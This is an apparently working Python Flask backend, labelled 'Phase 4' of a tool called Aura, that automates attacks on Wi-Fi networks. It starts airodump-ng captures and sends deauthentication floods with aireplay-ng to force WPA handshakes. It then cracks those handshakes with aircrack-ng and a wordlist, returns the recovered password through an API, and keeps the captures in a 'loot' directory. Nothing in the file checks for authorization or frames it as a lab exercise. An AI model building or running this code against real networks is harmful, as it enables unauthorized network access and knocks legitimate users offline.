# app.py - PHASE 4: DATA MANAGEMENT & POST-EXPLOITATION

import subprocess
import os
import signal
import json
import re
import threading
import time
import atexit
import uuid
from flask import Flask, jsonify, request
from flask_cors import CORS

# --- Application Setup ---
app = Flask(__name__)
CORS(app)

try:
    with open('config.json', 'r') as f:
        CONFIG = json.load(f)
except FileNotFoundError:
    print("❌ FATAL: config.json not found. Please create it.")
    exit()

LOOT_DIR = CONFIG.get("loot_directory", "loot")
WORDLIST_PATH = CONFIG.get("wordlist_path", "")
os.makedirs(LOOT_DIR, exist_ok=True)

# --- Global State ---
NETWORK_DB = {}
ACTIVE_PROCESSES = {'scan': None}
ACTIVE_TASKS = {}
SCAN_OUTPUT_PREFIX = "/tmp/aura_p4_scan"

# --- Core Attack & Cracking Logic ---

def execute_handshake_capture(task_id, bssid, channel, interface):
    """(From Phase 3) Runs the entire handshake capture process."""
    global ACTIVE_TASKS, NETWORK_DB
    proc_airodump = None
    capture_file_prefix = os.path.join(LOOT_DIR, f"capture_{bssid.replace(':', '')}_{int(time.time())}")
    
    try:
        ACTIVE_TASKS[task_id]['status'] = f"Starting listener on channel {channel}..."
        airodump_command = ['airodump-ng', '--bssid', bssid, '-c', channel, '-w', capture_file_prefix, '--output-format', 'cap', interface]
        proc_airodump = subprocess.Popen(airodump_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)

        ACTIVE_TASKS[task_id]['status'] = "Sending deauthentication packets..."
        deauth_command = ['aireplay-ng', '--deauth', '10', '-a', bssid, interface]
        subprocess.run(deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
        
        ACTIVE_TASKS[task_id]['status'] = "Monitoring for handshake... (timeout in 45s)"
        capture_file = f"{capture_file_prefix}-01.cap"
        end_time = time.time() + 45
        handshake_found = False
        while time.time() < end_time:
            if os.path.exists(capture_file):
                result = subprocess.run(['aircrack-ng', capture_file], capture_output=True, text=True)
                if "WPA (1 handshake)" in result.stdout or "WPA (1 handshake, EAPOL)" in result.stdout:
                    ACTIVE_TASKS[task_id].update({'status': "Success: WPA Handshake captured!", 'result': capture_file})
                    NETWORK_DB[bssid]['handshake_captured'] = True
                    handshake_found = True
                    break
            time.sleep(3)

        if not handshake_found:
            ACTIVE_TASKS[task_id].update({'status': "Failure: Timed out waiting for handshake.", 'result': None})

    except Exception as e:
        ACTIVE_TASKS[task_id]['status'] = f"Error: {e}"
    finally:
        if proc_airodump:
            proc_airodump.terminate()
            proc_airodump.wait()
        ACTIVE_TASKS[task_id]['complete'] = True

def execute_crack(task_id, filename):
    """Runs aircrack-ng with a wordlist in a separate thread."""
    global ACTIVE_TASKS
    
    if not WORDLIST_PATH or not os.path.exists(WORDLIST_PATH):
        ACTIVE_TASKS[task_id].update({'status': "Error: Wordlist not found or not configured.", 'complete': True})
        return

    filepath = os.path.join(LOOT_DIR, filename)
    if not os.path.exists(filepath):
        ACTIVE_TASKS[task_id].update({'status': f"Error: File '{filename}' not found.", 'complete': True})
        return

    try:
        ACTIVE_TASKS[task_id]['status'] = f"Cracking {filename} with wordlist..."
        command = ['aircrack-ng', '-w', WORDLIST_PATH, '-q', filepath]
        
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=600) # 10 minute timeout

        key_found_match = re.search(r"KEY FOUND! \[ (.*) \]", stdout)
        if key_found_match:
            password = key_found_match.group(1)
            ACTIVE_TASKS[task_id].update({'status': "Success: KEY FOUND!", 'result': password})
        else:
            ACTIVE_TASKS[task_id].update({'status': "Failure: Key not found in wordlist."})

    except subprocess.TimeoutExpired:
        ACTIVE_TASKS[task_id]['status'] = "Failure: Cracking process timed out."
    except Exception as e:
        ACTIVE_TASKS[task_id]['status'] = f"Error: {e}"
    finally:
        ACTIVE_TASKS[task_id]['complete'] = True


# --- API Endpoints ---
# ... (All previous API endpoints like /api/interfaces, /api/scan/* are required here) ...

@app.route('/api/attacks/start/<attack_type>', methods=['POST'])
def start_attack(attack_type):
    """Generic endpoint to start different types of attacks."""
    task_id = str(uuid.uuid4())
    ACTIVE_TASKS[task_id] = {'status': 'Pending...', 'complete': False}
    data = request.get_json()

    if attack_type == 'handshake':
        bssid, channel, interface = data.get('bssid'), data.get('channel'), data.get('interface')
        if not all([bssid, channel, interface]): return jsonify({'error': 'Missing params'}), 400
        thread = threading.Thread(target=execute_handshake_capture, args=(task_id, bssid, channel, interface))
    elif attack_type == 'crack':
        filename = data.get('filename')
        if not filename: return jsonify({'error': 'Missing filename'}), 400
        thread = threading.Thread(target=execute_crack, args=(task_id, filename))
    else:
        return jsonify({'error': 'Unknown attack type'}), 400

    thread.daemon = True
    thread.start()
    return jsonify({'task_id': task_id})

@app.route('/api/attacks/status/<task_id>', methods=['GET'])
def get_attack_status(task_id):
    return jsonify(ACTIVE_TASKS.get(task_id, {'error': 'Task not found'}))

@app.route('/api/loot', methods=['GET'])
def get_loot():
    """Scans the loot directory and returns info on captured files."""
    loot_files = []
    for filename in os.listdir(LOOT_DIR):
        if filename.endswith(".cap"):
            filepath = os.path.join(LOOT_DIR, filename)
            loot_files.append({
                'filename': filename,
                'size_kb': round(os.path.getsize(filepath) / 1024, 2),
                'created_at': int(os.path.getctime(filepath))
            })
    return jsonify(sorted(loot_files, key=lambda x: x['created_at'], reverse=True))


if __name__ == '__main__':
    # This assumes the full app.py from Phase 3 is here, with the additions above.
    print("--- Aura Backend v3.2 (Phase 4: Loot Management) ---")
    app.run(host='127.0.0.1', port=5000)